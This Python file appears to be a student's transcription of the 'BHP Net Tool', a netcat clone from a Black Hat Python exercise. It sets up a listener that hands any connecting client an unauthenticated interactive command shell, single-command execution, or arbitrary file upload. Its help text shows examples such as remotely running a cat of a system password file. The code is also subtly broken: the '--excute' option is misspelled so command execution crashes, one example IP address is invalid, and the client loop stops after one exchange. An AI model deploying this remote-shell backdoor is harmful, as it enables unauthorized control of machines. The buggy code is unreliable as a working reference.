import argparse
import socket
import shlex
# subprocess library is a powerful process-creation interface taht gives us ways to interact with client programs
import subprocess
import sys
import textwrap
import threading
from urllib import response

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)

    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        # setting up listener or call send method
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        # connect to the target and port
        self.socket.connect((self.args.target, self.args.port))
        # if we have buffer, we send that to the target first
        if self.buffer:
            self.socket.send(self.buffer)
        
        # set up try/catch block so we can manually close the connection with CTRL-C
        try:
            recv_len = 1
            response = ''
            # receive data from target
            while recv_len:
                data = self.socket.recv(4096)
                recv_len = len(data)
                response += data.decode()
                # no more data
                if recv_len < 4096:
                    break
            # print response
            if response:
                print(response)
                buffer = input('>')
                buffer += '\n'
                self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()
    
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            # set up a loop to listen for content on the listening socket and receive data until there's no more data coming in.
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            # write the content to the specified file
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    # argparse module use for create a command line interface
    # if user type with --help, will show the example
    parser = argparse.ArgumentParser(description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example: 
        netcat.py -t 912.168.1.108 -p 5555 -l -c # command shell
        netcat.py -t 192.168.1.108 - p 5555 -l -u=mytest.txt # upload to file
        netcat.py -t 192.168.1.108 - p 5555 -l -e=\"cat /etc/passed\" # execute command
        echo 'ABC | ./netcat.py -t 192.168.1.108 - p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server
    '''))

    # -c argument sets up an interactive shell
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    # -e argument executes one specific command
    parser.add_argument('-e', '--excute', help='execute specified command')
    # -l argument indicates that a listener should be set up
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    # -p argument specifies the port on which to communicate
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    # -t argument specifies the target IP
    parser.add_argument('-t', '--target', default='192.168.1.103', help='specified IP')
    # -u argument specifies the name of a file too upload
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    
    nc = NetCat(args, buffer.encode())
    nc.run()